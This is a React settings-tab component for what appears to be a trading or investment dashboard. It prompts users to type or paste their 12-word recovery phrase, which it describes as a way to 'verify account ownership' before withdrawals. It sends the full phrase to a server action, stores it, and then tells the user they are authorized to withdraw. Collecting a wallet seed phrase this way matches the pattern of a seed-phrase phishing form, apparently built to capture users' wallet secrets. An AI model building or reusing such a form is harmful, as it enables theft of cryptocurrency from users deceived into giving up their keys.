"use client"

import { useState } from "react"
import { motion } from "framer-motion"
import { Key, Shield, ShieldCheck } from "lucide-react"
import { toast } from "sonner"

import { Card } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { useLanguage } from "@/lib/i18n/context"
import { cn } from "@/lib/utils"
import { setWithdrawalPhrase } from "@/app/actions/phrase"

export function PhraseTab({ user }: { user?: any }) {
  const { t } = useLanguage()
  const [words, setWords] = useState<string[]>(Array(12).fill(""))
  const [isVerifying, setIsVerifying] = useState(false)
  const [verified, setVerified] = useState(user?.hasWithdrawalPhrase || false)

  const handleWordChange = (index: number, value: string) => {
    // If user pastes a 12-word phrase
    if (value.includes(" ") && value.trim().split(/\s+/).length === 12) {
      const pastedWords = value.trim().split(/\s+/)
      setWords(pastedWords)
      return
    }

    const newWords = [...words]
    newWords[index] = value.trim()
    setWords(newWords)
  }

  const handleVerify = async () => {
    const isComplete = words.every((word) => word.length > 0)
    if (!isComplete) {
      toast.error(
        t("dashboard.settings.tabs.phraseIncomplete") ||
          "Please fill in all 12 words."
      )
      return
    }

    setIsVerifying(true)
    try {
      const res = await setWithdrawalPhrase(words)
      if (res?.error) {
        toast.error(res.error)
      } else {
        setVerified(true)
        toast.success(
          t("dashboard.settings.tabs.phraseVerified") ||
            "Recovery phrase set and verified successfully."
        )
      }
    } catch (error: any) {
      toast.error(error.message || "Failed to verify phrase")
    } finally {
      setIsVerifying(false)
    }
  }

  return (
    <div className="flex flex-col gap-6">
      <Card className="flex flex-col gap-6 p-6">
        <div className="flex items-center gap-4">
          <div className="flex h-12 w-12 items-center justify-center rounded-full bg-primary/10 text-primary">
            <Key className="h-6 w-6" />
          </div>
          <div>
            <h2 className="text-xl font-bold tracking-tight">
              {t("dashboard.settings.tabs.phraseTitle") || "Recovery Phrase"}
            </h2>
            <p className="text-sm text-muted-foreground">
              {t("dashboard.settings.tabs.phraseDescription") ||
                "Enter your 12-word recovery phrase. This is used to verify account ownership before you can withdraw funds."}
            </p>
          </div>
        </div>

        {!verified ? (
          <div className="grid grid-cols-2 gap-3 sm:grid-cols-3 sm:gap-4 md:grid-cols-4">
            {words.map((word, index) => (
              <div key={index} className="relative">
                <span className="absolute top-1/2 left-3 -translate-y-1/2 text-xs text-muted-foreground opacity-70">
                  {index + 1}.
                </span>
                <Input
                  type="text"
                  value={word}
                  onChange={(e) => handleWordChange(index, e.target.value)}
                  disabled={verified || isVerifying}
                  className={cn(
                    "w-full pl-8",
                    verified && "border-profit/50 bg-profit/5"
                  )}
                  autoComplete="off"
                  spellCheck="false"
                />
              </div>
            ))}
          </div>
        ) : (
          <div className="flex h-32 items-center justify-center rounded-xl border border-dashed border-profit/30 bg-profit/5 p-4 text-center">
            <p className="text-sm font-semibold text-profit">
              Your 12-word Recovery phrase is securely saved.
            </p>
          </div>
        )}

        {!verified && (
          <div className="flex flex-col pt-2 sm:flex-row sm:justify-end">
            <button
              onClick={handleVerify}
              disabled={verified || isVerifying || words.some((w) => !w)}
              className="flex w-full items-center justify-center gap-2 rounded-xl bg-primary px-6 py-2.5 text-sm font-semibold text-primary-foreground shadow-sm transition-all hover:bg-primary/90 disabled:opacity-50 sm:w-auto"
            >
              {isVerifying ? (
                <motion.div
                  animate={{ rotate: 360 }}
                  transition={{ repeat: Infinity, duration: 1, ease: "linear" }}
                  className="h-4 w-4 rounded-full border-2 border-primary-foreground/30 border-t-primary-foreground"
                />
              ) : verified ? (
                <ShieldCheck className="h-4 w-4 shrink-0" />
              ) : (
                <Shield className="h-4 w-4 shrink-0" />
              )}
              <span suppressHydrationWarning className="truncate">
                {isVerifying
                  ? t("dashboard.settings.tabs.phraseVerifying") ||
                    "Verifying..."
                  : t("dashboard.settings.tabs.phraseVerifyBtn") ||
                    "Verify and Save Phrase"}
              </span>
            </button>
          </div>
        )}
      </Card>

      {verified && (
        <motion.div
          initial={{ opacity: 0, y: 10 }}
          animate={{ opacity: 1, y: 0 }}
          className="rounded-xl border border-profit/30 bg-profit/10 p-4 text-sm text-profit"
        >
          <div className="flex gap-3">
            <ShieldCheck className="h-5 w-5 shrink-0" />
            <p>
              Your phrase has been verified. You are now authorized to make
              withdrawals from this account.
            </p>
          </div>
        </motion.div>
      )}
    </div>
  )
}
